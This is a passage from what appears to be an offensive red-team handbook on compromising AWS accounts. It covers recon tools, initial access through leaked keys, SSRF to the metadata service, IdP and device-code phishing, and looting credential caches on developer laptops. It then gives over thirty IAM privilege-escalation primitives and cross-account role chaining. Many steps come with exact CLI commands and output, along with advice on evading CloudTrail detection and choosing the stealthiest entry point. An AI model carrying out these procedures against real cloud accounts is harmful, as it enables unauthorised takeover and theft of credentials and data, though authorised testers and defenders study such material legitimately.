These five calls produce a ton of intelligence: the principal ARN (attached to a user or role), the complete IAM graph (authorization-details), the org membership, the opted-in regions, and a first-pass EC2 inventory. If get-account-authorization-details is denied, fall back to enumerating per-object with list-users, list-roles, list-policies, and attached-policy calls.

OPERATOR NOTE

get-account-authorization-details is sometimes the single loudest call you can make — one API invocation that returns the entire IAM state, and one row in CloudTrail that a well-tuned detection will flag as anomalous for a non-admin principal. If the engagement is OPSEC-critical, avoid it and build the picture with many smaller list-* calls distributed over time and across principals you have collected.

5.4  ScoutSuite, Prowler, and the compliance-adjacent tools

ScoutSuite and Prowler are not offensive tools per se — they are audit scanners that emit HTML reports keyed to CIS benchmarks, PCI, and similar. For a red-teamer, they are a cheat code: they find configuration issues that a defender knows to look for and thus frames the findings in the blue team's language. If Prowler tells you S3 bucket X is publicly writable, your finding lands with the customer already mapped to a remediation step.

5.5  PMapper for privilege-escalation graphs

PMapper (Principal Mapper) builds a directed graph where nodes are IAM principals and edges are "X can become Y." An edge might represent AssumeRole trust, iam:PassRole + a compute service, or iam:CreateAccessKey on another user. The resulting graph answers the single most important question in an engagement: from my current identity, which other identities can I reach?

operator@kali:~$ pmapper --profile target graph create
Organization graph: gathering data for 444455556666...

5.6  Reading role trust policies

A role's trust policy answers the question: who can assume this role? It is independent of the role's inline and attached policies (which answer: what can this role do?). An over-permissive trust policy is how cross-account takeover begins.

// dangerous trust policy
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": { "AWS": "*" },
    "Action": "sts:AssumeRole",
    "Condition": {
      "StringLike": { "aws:PrincipalArn": "arn:aws:iam::*:role/build-*" }
    }
  }]
}

This trust allows any role in any account matching build-* to assume it. If any AWS account — including the attacker's — has a role named build-ci or build-anything, it assumes into the target. Condition keys like this recur in real-world misconfigurations more often than operators expect.

5.7  Session-tag reconnaissance

IAM session tags (sts:AssumeRole with --tags) can be used by the caller to pass attribute data into the target role's session. Some policies evaluate aws:PrincipalTag conditions; if the trust policy allows sts:TagSession, an attacker can pass a tag they control to bypass conditions written against their attributes. CloudFox's iam-simulator flags trust policies that take session-tag input without sufficient protection.

Key takeaways

  • The first five commands (get-caller-identity, get-account-authorization-details, describe-organization, region list, per-region inventory) establish baseline truth.
  • CloudFox's all-checks produces a prioritized attack-path list you can read in 10 minutes.
  • Pacu's enumeration modules are the exploit-ready complement to CloudFox.
  • ScoutSuite and Prowler give you a blue-team-language view of the same issues.
  • PMapper draws the "who becomes whom" graph that drives Chapter 8.
Reconnaissance and Initial Access

Initial Access Vectors

Chapter Goal

Walk through the six initial-access classes most productive in 2026: leaked access keys in source and artifacts, SSRF into IMDS, phishing of federated console users, OAuth app compromise, stolen developer workstation caches, and device-code phishing against IAM Identity Center. For each, cover detection, tooling, and the pivot into an authenticated session.

Initial access is the single most consequential step in an AWS engagement, because everything downstream assumes credentials. It is also the one step where the offensive industry has learned to outpace defender tooling. Scanning GitHub for AKIA patterns is not 2016 tradecraft — it is 2026 tradecraft, because developers still leak keys, CI systems still echo secrets, and mobile apps still ship with baked-in roles.

6.1  Leaked access keys

An AWS access key ID is a 20-character uppercase-alphanumeric string that begins with AKIA (long-term key) or ASIA (short-term session). The secret is a 40-character base64-ish string. These patterns are perfectly regex-able, and the ecosystem of tools around them is mature.

  • trufflehog — scans filesystems, git repositories (including history), Docker images, S3 buckets, GitHub organizations, GitLab organizations, and PostgreSQL databases for credentials. Verified mode actively tests each finding with sts:GetCallerIdentity, eliminating false positives.
  • gitleaks — fast local scanner focused on git history. Useful as a pre-commit hook on the defender side and as a forensic sweep tool on the offensive side.
  • noseyparker — high-performance multi-pattern scanner; the author finds it best-in-class for multi-gigabyte archive sweeps.
  • ghe-tools / GH code search — GitHub's code search supports regex; a search for "AKIA" AND "wJalr" across a company's public repos routinely returns live keys.

6.2  Keys in Docker images

Docker images on Docker Hub, Amazon ECR Public, GitHub Container Registry, and GitLab Container Registry are a distinct leak source. Developers COPY .env into their image during a Dockerfile build, never delete the resulting layer, and push the image publicly. trufflehog docker --image <url> extracts every layer and scans each for secrets.

6.3  Keys in mobile applications

Mobile apps frequently contain AWS keys or Cognito identity-pool IDs that can be used to obtain STS sessions. Procedure:

  1. Download the APK / IPA (e.g., from apkpure.com or directly from the store).
  2. Decompile with apktool (Android) or unpack the IPA (unzip then inspect the binary with strings or class-dump).
  3. Grep decompiled source for AKIA, ASIA, cognito-identity, sts., secretsmanager, and amazonaws.com.
  4. Attempt a Cognito unauthenticated sign-in against the discovered identity pool:
operator@kali:~/ios$ aws cognito-identity get-id --identity-pool-id us-east-1:abcd1234-abcd-abcd-abcd-abcdef123456 --no-sign-request
{"IdentityId":"us-east-1:ffffefff-eeee-dddd-cccc-bbbbbbbbbbbb"}
operator@kali:~/ios$ aws cognito-identity get-credentials-for-identity --identity-id us-east-1:ffffefff... --no-sign-request

operator@kali:~/ios$ aws sts get-caller-identity

The unauthenticated Cognito role's permissions dictate what you can do next. It is often surprisingly over-permissive — s3:GetObject on "user upload" buckets, dynamodb:Query on an "app" table, even lambda:InvokeFunction on a named function that performs its own authorization. Every one of those is an exploit pivot.

6.4  SSRF into IMDS

The Instance Metadata Service at http://169.254.169.254/ on every EC2 instance returns the session credentials for the instance's attached IAM role. If you can make the EC2 instance fetch an arbitrary URL — through an HTTP-client library's misuse, a PDF renderer that fetches images, a webhook handler that takes a URL parameter, an image-proxy endpoint — you have SSRF. SSRF into IMDS returns the role's session credentials.

EC2-App-InstanceRole

IMDSv2 bypass landscape

IMDSv2, the token-based replacement for IMDSv1, requires a PUT to /latest/api/token with X-aws-ec2-metadata-token-ttl-seconds to obtain a session token, then a GET with that token in X-aws-ec2-metadata-token. SSRF primitives that can only emit GET requests cannot directly reach IMDSv2. But:

  • Many real-world SSRF primitives support arbitrary methods, headers, and bodies (webhook fetchers, RPC-style endpoints).
  • The hop-count header (X-Forwarded-For-style behavior) for IMDSv2 defaults to 1, which blocks containerized SSRF on Fargate but not on classic EC2 userland.
  • Instances launched before the IMDSv2-default rollout (mid-2023 for new AMIs) may still accept IMDSv1.
  • Tag-based enforcement (ec2:MetadataHttpTokens=required) is customer-configured per-instance — plenty of production fleets still have mixed mode.

6.5  Phishing federated console users

A substantial fraction of AWS compromises in 2025 came from phishing — not of the target directly, but of their IdP. Okta, Entra ID, and Google Workspace are the identity layer; an IdP compromise issues a SAML assertion or OIDC token that federates cleanly into AWS. The red-team versions:

  • IdP credential phishing + MFA bypass. Classic evilginx2-style AiTM proxy against the IdP's login page. Post-MFA, the captured session cookie grants access for its TTL. From there, any SAML app federated off the IdP is reachable, AWS included.
  • Device-code flow abuse against IAM Identity Center. Identity Center supports device-code flow for the AWS CLI (aws configure sso). An attacker initiates the flow, sends the eight-character code to the victim framed as an IT request, and once the victim approves, the attacker's host walks into every permission set the victim has.
  • Consent phishing. An OAuth app the victim consents to in Entra ID can request delegated permissions that include federated AWS role assumption. The victim sees a small consent prompt; the attacker gains persistent access.

https://acme.awsapps.com/start/#/device?user_code=DNFG-QVPM

Anomalous-source-IP detections on Identity Center sign-in events pair well. On the user-awareness side: device-code flows should never be initiated by a user reading a message; they must always originate from the user's own CLI prompt.

6.6  Developer workstation caches

On a compromised developer laptop, several caches are worth targeting before any on-disk scan for plaintext keys:

  • ~/.aws/credentials — long-term keys (AKIA/Secret) for named profiles.
  • ~/.aws/sso/cache/*.json — IAM Identity Center access tokens and refresh tokens.
  • ~/.aws/cli/cache/*.json — role-session cache from aws sts assume-role with --profile + source_profile config.
  • aws-vault backing store — macOS Keychain or secret-service on Linux. A keychain dump or equivalent extracts the encrypted blob, which is decryptable by the unlocked user session.
  • saml2aws and leapp caches — similar patterns to aws-vault.
  • Shell history — ~/.zsh_history, ~/.bash_history frequently contain aws sts assume-role invocations with the full arn and session name, even if not the credentials themselves.
  • Docker desktop credential helper — stored in macOS Keychain, recoverable from an unlocked user.

6.7  Third-party OAuth application compromise

Customers integrate third-party SaaS with AWS via cross-account roles all the time — Datadog, Wiz, Orca, CrowdStrike, Lacework, etc. Each of these integrations involves a role in the customer's AWS account with a trust policy allowing the vendor's AWS account to assume it. A compromise of the vendor (or of the vendor's session tokens for a specific customer) pivots straight into the customer's account. The typical trust looks like:

{
  "Effect": "Allow",
  "Principal": { "AWS": "arn:aws:iam::464622532012:root" },   // vendor account
  "Action": "sts:AssumeRole",
  "Condition": {
    "StringEquals": { "sts:ExternalId": "customer-123-abc" }
  }
}

Post-2022 AWS requires that sts:ExternalId be validated when present, reducing the "confused deputy" risk; but the overall trust remains as strong as the vendor's security posture. A customer who has integrated 18 SaaS platforms via cross-account roles has 18 separate "the vendor gets popped" pivots into their account.

6.8  Initial access recap and picking the right door

Given a full set of options, an experienced operator will pick in this rough order of stealth (quietest first):

  1. Leaked keys found in public source or mobile apps (attacker never touches the target's infrastructure during recon).
  2. SSRF into IMDS on a public EC2-backed web app (touches the target but only through an application-layer vuln that was already there).
  3. Device-code or IdP-consent phishing of a federated user (loud in IdP logs but quiet in AWS).
  4. Direct IdP credential phishing with evilginx-style proxy (loud in IdP logs).
  5. Brute-force / password-spray against AWS-native IAM users (loudest; GuardDuty will alert quickly).

Key takeaways

  • Leaked AWS keys remain the most common initial-access vector and the most operationally efficient.
  • SSRF into IMDS is still productive; IMDSv2 hardening has shrunk but not eliminated the primitive.
  • Phishing the IdP (Okta/Entra) via evilginx or device-code is the preferred vector for AWS console access.
  • Mobile apps and Docker images are neglected but rich sources of AWS credentials.
  • Vendor / third-party trust relationships are an underappreciated lateral-into-customer path.

IAM Deep Dive for Attackers

Chapter Goal

If you can recite how AWS evaluates an API call — which policies are consulted, in what order, with what precedence — you will read a misconfigured IAM statement faster than the engineer who wrote it. The flowchart is the single most important image in this book; everything else is application of it.

7.1  The six policy types

On every API call AWS aggregates and evaluates up to six categories of policy. Not all apply to every call; the evaluation algorithm knows how to skip the ones that do not. But all six are potential attack surfaces.

  1. Service Control Policies (SCPs). Attached at the Organizations root or OU level. SCPs set the maximum permissions for any principal in an affected account, including the root user. They do not grant; they only restrict. An SCP of Deny * at the root renders every child account unusable.
  2. Resource-based policies. Attached to the resource itself: S3 bucket policy, KMS key policy, Lambda resource policy, SNS/SQS access policy, Secrets Manager resource policy, ECR repository policy, Glue resource policy, API Gateway resource policy. These grant access to principals regardless of the principal's own identity policy.
  3. Identity-based policies. Attached to an IAM user, group, or role: managed policies (AWS-managed or customer-managed) and inline policies. These grant the principal the ability to call APIs.
  4. Permission boundaries. Optional. Attached to an IAM user or role as a ceiling — the principal's effective permissions are the intersection of its identity policies and its permission boundary.
  5. Session policies. Passed by the caller at sts:AssumeRole time via --policy. The resulting session's permissions are the intersection of the role's identity policies and the session policy.
  6. VPC endpoint policies. Attached to a gateway or interface VPC endpoint (for S3, DynamoDB, and interface-endpoint-enabled services). Scope which principals and actions are permitted through that endpoint.

7.2  The canonical evaluation flowchart

The rules are simple, which is why this flowchart is ubiquitous in every AWS security presentation. Read it left-to-right as an algorithm: at each gate, if the answer makes the call fail, the call is denied; otherwise continue.

7.3  Explicit deny precedence

A single Effect: Deny anywhere in any applicable policy beats every Effect: Allow. This is both the defender's strongest tool and the mechanism that, when mis-written, bricks an entire organization. SCPs in particular are death by mis-scoping — a Deny on s3:* without a resource exclusion will block S3 for every principal in every affected account including the root user. Production operators see this every quarter.

For an attacker, the presence of an explicit deny in a customer-managed policy is both a signal (the defender actively thought about this call) and an obstacle (your chosen primitive will not work as-is). Seasoned operators read the full identity policy of any role they intend to use, not just the simulated-allow flag from PMapper or Pacu.

7.4  Principal types in policy

The Principal element of a resource policy or a role trust policy admits several forms:

  • {"AWS": "arn:aws:iam::123456789012:role/Foo"} — specific role.
  • {"AWS": "arn:aws:iam::123456789012:root"} — any principal in the account. In a trust policy, this means "any IAM user or role in account 123456789012 that has sts:AssumeRole in its identity policy." This is a common pattern — and is not a wildcard; the other account's IAM still gates who can assume.
  • {"AWS": "*"} — literally any AWS principal. In S3 bucket policy this means "any authenticated AWS user anywhere." In a role trust policy it means the same; combined with a missing Condition this is a total takeover primitive.
  • {"Service": "ec2.amazonaws.com"} — AWS service principal. EC2 service assumes the role on the user's behalf when launching instances. Cannot be forged; but service-principal trust still needs hardening against confused deputies.
  • {"Federated": "arn:aws:iam::123456789012:saml-provider/Okta"} — SAML provider. The SAML assertion's Role attribute picks which role gets assumed.
  • {"Federated": "arn:aws:iam::123456789012:oidc-provider/token.actions.githubusercontent.com"} — OIDC provider. Conditions on the token's sub field gate which repo / branch can assume.
  • {"CanonicalUser": "<64-hex>"} — legacy S3 canonical user ID. Pre-dates account IDs.

7.5  Condition keys — the grammar that gets misused

Conditions narrow when a statement applies. They are the most frequently abused element of policy, because operators reach for conditions when plain principal scoping would be cleaner. The condition keys most worth knowing:

Read every condition block with one question: does the principal I control the inputs for pass this check? If the condition is on a tag that you can set on yourself, on an IP that you can source-route through a service, or on an ExternalId that is guessable from public documentation, the condition is decorative.

7.6  Resource policy surface

Every service with a resource-based policy is a potential back door:

  • S3 bucket policy. Principal: "*" with Action: s3:GetObject makes the bucket world-readable. Principal: "*" with Action: s3:* is a worldwide bucket takeover primitive.
  • KMS key policy. If the key policy allows kms:Decrypt to Principal: "*", anyone can use the key to decrypt; combined with a bucket policy that allows s3:GetObject on SSE-KMS-encrypted objects, a world-readable bucket is truly world-readable.
  • Lambda resource policy. The "invoke policy" attached via lambda:AddPermission. Principal: "*" allows anyone with access to the ARN to invoke the function. Many Lambda URL misconfigurations are this.
  • SNS access policy. Controls who can publish and subscribe. Misconfigurations allow arbitrary third-party accounts to flood topics.
  • SQS access policy. Same pattern; widely open SQS queues act as ingress bus into downstream Lambda triggers.
  • Secrets Manager resource policy. Who can GetSecretValue. Over-permissive resource policy lets cross-account principals read secrets.
  • ECR repository policy. Who can pull images. An over-permissive ECR policy lets attackers who have not compromised the account pull production images and analyze them.
  • Glue resource policy. Who can read Glue Data Catalog. Often overlooked; contains column-level metadata that reveals schema of production data.

7.7  Role trust policies revisited

A role trust policy is a special kind of resource policy that lists which principals can call sts:AssumeRole for the role. Three anti-patterns operators find repeatedly:

  • Principal * with no Condition. Total takeover. Any AWS account can assume.
  • Principal * with only StringLike on a PrincipalArn pattern. As in Chapter 5's example — an attacker creates a matching role name in their own account and satisfies the pattern.
  • Principal {"Service": "ec2.amazonaws.com"} with no Condition. In itself benign — only EC2 assumes for instance-profile purposes. But if an attacker controls EC2-launch paths (iam:PassRole + ec2:RunInstances), they effectively assume via this door. See the privesc matrix in Chapter 8.

7.8  The confused-deputy problem and ExternalId

Confused deputy is the classical identity-security problem: a trusted intermediary is tricked into doing something on behalf of an attacker that the intermediary's own permissions allow but the attacker's do not. In AWS, the canonical instance was third-party SaaS vendors with wide cross-account trust: an attacker signs up as a customer of the vendor, references another real customer's account ID in their configuration, and the vendor obligingly assumes a role in the wrong customer's account.

sts:ExternalId was introduced as the canonical fix: the customer supplies a secret string to the vendor; the vendor includes it in every AssumeRole call; the trust policy requires it. Prior to March 2022, ExternalId was optional and frequently missing. AWS's March 2022 behavioral change required vendors to pass ExternalId when present in the trust; it does not, however, require trust policies to include the condition. Older cross-account trusts from before 2022 that have never been reviewed are still often missing the ExternalId requirement.

7.9  SourceIdentity and the audit-trail angle

sts:SourceIdentity is a newer (2021) feature that lets a role-assumer attach a string identifying "who they really are" in the final CloudTrail record. Defenders use it to preserve accountability across role chains. As an attacker: if SourceIdentity is required by the trust policy (sts:RoleSessionName or sts:SourceIdentity conditions) and you cannot supply an acceptable value, you cannot chain through that role. Test with your actual operator identity to see what's enforced.

7.10  Access Analyzer — defender radar you can read

AWS's IAM Access Analyzer, when enabled, produces "findings" for resources (roles, S3 buckets, KMS keys, etc.) that are accessible from outside the account or outside the organization. For an attacker with enumeration access to the target account, Access Analyzer findings are a cheat code: they surface every role whose trust admits an external principal, every bucket with a cross-account share, every KMS key with cross-account decrypt. Running aws accessanalyzer list-findings against a compromised admin-read role is worth more than hours of manual policy reading.

Key takeaways

  • Six policy types, evaluated together: SCP, resource, identity, permission boundary, session, VPC endpoint.
  • Explicit deny always wins. An allow requires all applicable stages to agree.
  • Principal element accepts AWS, Service, Federated, CanonicalUser. Each has attack angles.
  • Conditions turn decorative fast when they use StringLike wildcards, unverified tags, or missing ExternalId.
  • Role trust policies are resource policies in disguise; read them like S3 bucket policies.
  • Access Analyzer is the defender's radar and — for an attacker with read access — a map of every crack in the identity plane.

Privilege Escalation Techniques

Chapter Goal

Walk through each of the canonical IAM privilege-escalation primitives, their prerequisites, the exact API sequence, detection opportunities, and the CloudGoat / IAM Vulnerable scenario that demonstrates each. End with the privilege-escalation matrix that you will reach for in every engagement.

Rhino Security Labs's original "AWS IAM Privilege Escalation" research from 2018 catalogued 21 primitives; the community has since pushed the count past thirty. What follows is the 2026 operator's complete list.

8.1  Primitive 1: iam:CreateAccessKey on another user

The simplest primitive. If your principal has iam:CreateAccessKey with a resource pattern that matches an admin user, you can mint a new access key for that admin and start using it.

operator@kali:~$ aws iam create-access-key --user-name admin
{
  "AccessKey": {
    "UserName": "admin",
    "AccessKeyId": "AKIAEXAMPLECREATEADMIN",
    "Status": "Active",
    "SecretAccessKey": "wJalrEXAMPLE...",
    "CreateDate": "2026-04-20T14:12:00Z"
  }
}
operator@kali:~$ aws sts get-caller-identity --access-key-id AKIAEXAMPLECREATEADMIN --secret-access-key ...
{
  "Arn": "arn:aws:iam::444455556666:user/admin"
}

Detection. CloudTrail CreateAccessKey with a userName that is not the caller's own is the canonical detection; GuardDuty flags it as IAMUser/CredentialExfiltration when followed by anomalous source-IP activity.

8.2  Primitive 2: iam:AttachUserPolicy / AttachRolePolicy / AttachGroupPolicy

If your principal can attach managed policies to itself or to another principal, attach arn:aws:iam::aws:policy/AdministratorAccess and you are done.

operator@kali:~$ aws iam attach-user-policy --user-name ci-deploy-bot --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
# no response body on success
operator@kali:~$ aws iam list-attached-user-policies --user-name ci-deploy-bot
{
  "AttachedPolicies": [
    {"PolicyName": "AdministratorAccess", "PolicyArn": "arn:aws:iam::aws:policy/AdministratorAccess"},
    {"PolicyName": "ci-deploy-bot-base", "PolicyArn": "arn:aws:iam::444455556666:policy/ci-deploy-bot-base"}
  ]
}

8.3  Primitive 3: iam:PutUserPolicy / PutRolePolicy / PutGroupPolicy

Inline-policy variant of the attach primitive. Add a new inline policy granting *:*.

aws iam put-user-policy --user-name ci-deploy-bot \
  --policy-name escalate \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}'

8.4  Primitive 4: iam:CreatePolicyVersion with SetAsDefault=true

If your principal can create a new version of an existing customer-managed policy it uses, write a wide-open version and mark it default. The principal now has whatever the new version grants, regardless of what the previous version said.

operator@kali:~$ aws iam create-policy-version --policy-arn arn:aws:iam::444455556666:policy/ci-deploy-bot-base \
  --policy-document file://wide.json --set-as-default
{
  "PolicyVersion": {
    "VersionId": "v5", "IsDefaultVersion": true, "CreateDate": "2026-04-20T14:14:00Z"
  }
}

A blue team that sees CreatePolicyVersion on a policy they care about should alert immediately. This primitive is what CloudGoat's iam_privesc_by_rollback scenario teaches.

8.5  Primitive 5: iam:SetDefaultPolicyVersion

Sibling of the above: if a prior version was wide-open and someone rolled back to a strict one, SetDefaultPolicyVersion re-elevates by re-selecting the wider version. Does not require creating new content.

8.6  Primitive 6: iam:UpdateAssumeRolePolicy

If your principal can modify the trust policy of a role, rewrite the trust to include yourself as principal, then sts:AssumeRole. Works regardless of the role's identity policy — if it is a privileged role, you inherit the privilege.

  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"AWS":"arn:aws:iam::444455556666:user/ci-deploy-bot"},"Action":"sts:AssumeRole"}]}'
operator@kali:~$ aws sts assume-role --role-arn arn:aws:iam::444455556666:role/AdminRole --role-session-name recon
{"Credentials": {"AccessKeyId": "ASIA...", ...}}

8.7  Primitive 7: iam:PassRole + compute service

This is the single most common privilege-escalation primitive in the wild. The pattern: your principal has iam:PassRole on some role and the ability to create a resource in a compute service that runs as that role. The role then executes arbitrary code that calls whatever it is permitted to. The compute services with this shape:

  • ec2:RunInstances + iam:PassRole → instance-profile RCE
  • lambda:CreateFunction + iam:PassRole → Lambda RCE
  • glue:CreateJob + iam:PassRole → Glue job RCE
  • glue:CreateDevEndpoint + iam:PassRole → Glue dev endpoint shell
  • cloudformation:CreateStack / UpdateStack + iam:PassRole → CFN RCE via custom resource
  • sagemaker:CreateNotebookInstance + iam:PassRole → notebook shell
  • datapipeline:CreatePipeline + iam:PassRole → pipeline RCE
  • ecs:RegisterTaskDefinition + ecs:RunTask + iam:PassRole → ECS task RCE
  • codebuild:CreateProject + codebuild:StartBuild + iam:PassRole → build-container RCE
  • batch:RegisterJobDefinition + batch:SubmitJob + iam:PassRole → Batch RCE
  • stepfunctions:CreateStateMachine + iam:PassRole → state-machine-driven role takeover

8.8  Primitive 8: iam:UpdateLoginProfile

Changes the console password of any existing IAM user whose name you know. If the user also has the ability to call privileged APIs, you now have console access as that user.

8.9  Primitive 9: iam:CreateLoginProfile

Creates a console password for an IAM user who previously had no console access (programmatic-only). Useful when the target user has only an access key pair but broad permissions.

8.10  Primitive 10: iam:AddUserToGroup

Add yourself to a privileged group (often named admins or powerusers). Group membership inherits the group's attached policies.

8.11  Primitive 11: sts:AssumeRole to an over-permissive role

If a role's trust policy admits your principal (explicitly or via wildcard), and that role is more privileged, assuming it is escalation. CloudFox's role-trusts module surfaces these candidates.

8.12  Primitive 12: tag-based ABAC bypass

Policies that condition on aws:ResourceTag or aws:PrincipalTag can be bypassed if your principal has iam:TagUser, iam:TagRole, or sts:TagSession on itself or the resource. Tag yourself to match the condition and the policy admits the call.

8.13  Primitive 13: lambda:UpdateFunctionCode

If you cannot create a Lambda but can update an existing one whose role is privileged, replace its code with an exploit that runs with the role's permissions. Trigger it with lambda:InvokeFunction or wait for its next scheduled invocation.

8.14  Primitive 14: lambda:AddPermission

Add an invoke-permission to a privileged Lambda that lets you call it from a public source or your own account.

8.15  Primitive 15: codebuild:UpdateProject + StartBuild

Modify the build specification of an existing CodeBuild project whose service role is privileged, then kick a build. The build's buildspec.yml runs arbitrary commands as the service role.

8.16  Primitive 16: ssm:SendCommand on an EC2 with a privileged instance profile

Use Systems Manager to execute commands on an existing EC2 instance whose instance profile has elevated permissions. The EC2 invokes the commands as its profile role.

8.17  Primitive 17: glue:UpdateDevEndpoint with injected SSH key

A Glue development endpoint runs as a role. Updating its SSH public key (if permitted) gives the operator a shell on the endpoint, running as the role.

8.18  Primitive 18: CloudFormation stack-drift takeover

If you can modify a CloudFormation stack template and the stack is managed by a privileged service role, inserting a Custom:: resource pointed at an attacker-controlled Lambda yields RCE as the CFN role on next update.

8.19  Primitive 19: EC2 user-data overwrite

ec2:ModifyInstanceAttribute on UserData of a stopped instance, followed by StartInstances, executes arbitrary userdata on boot as the instance's role.

8.20  Primitive 20: Systems Manager parameter / Secrets Manager replacement

If a privileged workload reads a configuration value from SSM Parameter Store or Secrets Manager, and your principal can PutParameter or PutSecretValue, replacing the value with attacker-controlled content (a malicious endpoint, a SQL statement, a command string) is remote code injection via data path.

8.21  Primitive 21: EventBridge rule hijack

Rewrite an existing EventBridge rule's target to a Lambda you control, then wait for the triggering event (or generate one). The Lambda runs with the rule's invocation role or the target's execution role.

8.22  Primitive 22: S3 bucket notification to attacker Lambda

If a privileged Lambda is triggered by S3 object creation, and you can PutBucketNotificationConfiguration, re-route the notification to your own function or cascade an attacker-controlled pipeline.

8.23  Primitive 23: Step Functions state-machine rewrite

states:UpdateStateMachine changes the machine's definition; subsequent executions run as the machine's role against attacker-chosen services.

8.24  Primitive 24: IAM Identity Center permission-set escalation

If your principal can modify an Identity Center permission set and attach AdministratorAccess, every user currently assigned that permission set gains admin on their next sign-in.

8.25  Primitive 25: KMS grant to external principal

kms:CreateGrant can be called without grant-management permissions in some conditions; a grant to an attacker-controlled role lets them decrypt anything encrypted under that key.

8.26  Primitive 26: VPC endpoint policy relaxation

Relaxing a VPC endpoint policy turns an enforced-via-network-boundary restriction into a permissive one. Works only when the identity policy would otherwise allow — useful in defense-in-depth environments.

8.27  Primitive 27: Organizations SCP removal

If your principal has organizations:DetachPolicy, removing a restrictive SCP expands every child account's effective permissions. Loudest primitive imaginable — applies across the entire org.

8.28  Primitive 28: iam:PassRole on an over-wide target

A variant of primitive 7: if iam:PassRole on your identity policy is scoped Resource: *, you can pass any role to any service. This is the configuration that should never exist but still appears in customer-managed policies.

8.29  Primitive 29: IAM Identity Center session-tag injection

If the target uses aws:PrincipalTag in ABAC and the IdP passes a user-controlled attribute as a session tag, compromising the user's IdP profile (e.g., Okta profile editor) lets you assume the session tag that grants access.

8.30  Primitive 30: Service-linked role abuse

Service-linked roles (SLR) are pre-provisioned, service-specific roles. A few services (CloudFormation, Config, Auto Scaling) have SLRs with wider permissions than their name suggests. A principal that can invoke the service in the right shape causes the SLR to act on its behalf.

8.31  Primitive 31: iam:PassRole to AutoScaling launch template

A newer variant: modify an EC2 Launch Template's IamInstanceProfile reference, then trigger an Auto Scaling group refresh. New instances launch with an attacker-chosen role.

IAM Exploitation

Cross-Account Attacks and Role Chaining

Chapter Goal

Move from inside-one-account privesc to cross-account lateral movement. Cover STS role chaining, the OrganizationAccountAccessRole pathway, resource-policy abuse, AWS RAM shares, and the confused-deputy landscape before and after the March 2022 AWS behavior change.

A single AWS account compromise is often a finding; a cross-account compromise is usually a critical one. The identity primitives that move you between accounts are small in number — sts:AssumeRole, resource-policy share, RAM share — but the paths they trace through a multi-account organization can be deep.

9.1  Role chaining mechanics

Role chaining is the sequential assumption of one role from inside another's session. It is how almost every cross-account attack propagates. Two rules govern it:

  • A chained session inherits a maximum session duration of one hour, regardless of the target role's configured maximum. This is AWS-enforced; an operator planning a long-lived session must re-chain periodically.
  • The CloudTrail record for a chained AssumeRole in the target account shows the source role session as the caller, not the original user. This is useful for defenders doing attribution but can also be used offensively: inserting an intermediate role into the chain obscures the original principal.
operator@kali:~$ # Step 1: base user
operator@kali:~$ aws sts get-caller-identity --profile base
{"Arn":"arn:aws:iam::111122223333:user/base-operator"}
operator@kali:~$ # Step 2: assume staging role
operator@kali:~$ aws sts assume-role --role-arn arn:aws:iam::111122223333:role/staging-pipe --role-session-name pipe1 --profile base
{"Credentials":{"AccessKeyId":"ASIA1","SecretAccessKey":"...","SessionToken":"...","Expiration":"..."}}
operator@kali:~$ # Step 3: chain into prod via the staging role
operator@kali:~$ AWS_ACCESS_KEY_ID=ASIA1 AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=... \
  aws sts assume-role --role-arn arn:aws:iam::999988887777:role/prod-deploy --role-session-name pipe2
{"Credentials":{"AccessKeyId":"ASIA2","Expiration":"2026-04-20T15:12:00Z"}}
# ASIA2 is valid for at most 1 hour — chained sessions do not honor longer MaxDurationSeconds

9.2  The OrganizationAccountAccessRole pathway

AWS Organizations, when it creates member accounts via the API, provisions a role named OrganizationAccountAccessRole in every new member account. The role has AdministratorAccess, and its trust policy allows the management (master) account to assume it. This is documented, intentional, and the canonical cross-account-management primitive. It is also the most valuable cross-account pivot in the AWS ecosystem.

  • From the management account, an operator can assume OrganizationAccountAccessRole into any member account and immediately has administrative privileges.
  • From a non-management account, the role is not directly assumable — but if you compromise any identity that has sts:AssumeRole on arn:aws:iam::*:role/OrganizationAccountAccessRole, you have the same reach.
  • Some organizations rename the role (AWSControlTowerExecution is the Control Tower-managed equivalent) or lock it down. An attacker cannot assume what is not trusted to them; but the existence of these roles is always worth probing.

9.3  Cross-account sts:AssumeRole

Outside the Organizations-provisioned role, cross-account trust is established when account A's role has account B in its trust policy. The operator's job is to enumerate every such trust in every compromised account.

9.4  Resource-based policy cross-account abuse

Not every cross-account reach goes through a role. Resource policies are the other half of the story. Patterns that come up repeatedly:

  • S3 cross-account bucket read. A bucket policy that includes Principal: {"AWS":"arn:aws:iam::<other-acct>:root"} allows any principal in the other account with S3 permissions to read.
  • KMS cross-account decrypt. A KMS key policy that allows an external account to kms:Decrypt lets you decrypt all data encrypted under the key, regardless of where the ciphertext lives.
  • Lambda cross-account invoke. lambda:AddPermission can add an external account as allowed caller; an over-permissive Lambda with iam:PassRole-equivalent downstream actions becomes an attack proxy.
  • Secrets Manager cross-account. A resource policy that grants an external account secretsmanager:GetSecretValue lets them read the secret.
  • ECR cross-account pull. Pull production images, analyze for secrets.
  • RDS cross-account snapshot share. A snapshot shared with an external account can be copied and restored in the attacker's account, yielding a full database.

9.5  AWS RAM — shared resources across accounts

AWS Resource Access Manager (RAM) shares specific resources (subnets, transit gateways, license configurations, Route53 Resolver rules, Glue Data Catalog databases, …) with other accounts without invoking IAM. A RAM share that grants a subnet to another account allows that account to launch EC2 instances in that subnet — effectively giving the destination account network-plane presence inside the source account's VPC.

For an attacker that has compromised a "small" account, a RAM subnet share into a larger production VPC is a lateral-movement primitive that never crosses IAM at all. Detection is comparatively weak because the share targets are often owned by different principals than the attacker's IAM, and CloudTrail events come from the source account.

9.6  The confused-deputy landscape after 2022

In March 2022 AWS announced that when a third-party service performs an sts:AssumeRole on behalf of a customer, AWS enforces sts:ExternalId passing. The practical effect: a third-party vendor can no longer "forget" the ExternalId; if the customer's trust policy requires it, it must be present. The change closed a confused-deputy class, but three operational realities keep the category relevant:

  1. Trust policies predating the change may never have included the sts:ExternalId condition. The enforcement behavior means nothing if the condition is not there.
  2. Cross-account trusts that are not vendor-managed (i.e., between two customer-owned accounts) are not covered by the 2022 change at all; the customer must still write the condition.
  3. ExternalId values that are guessable from public documentation, support tickets, or recycled across tenants are effectively not secret. A vendor who uses a per-account hash of the customer's name has defeated the purpose.

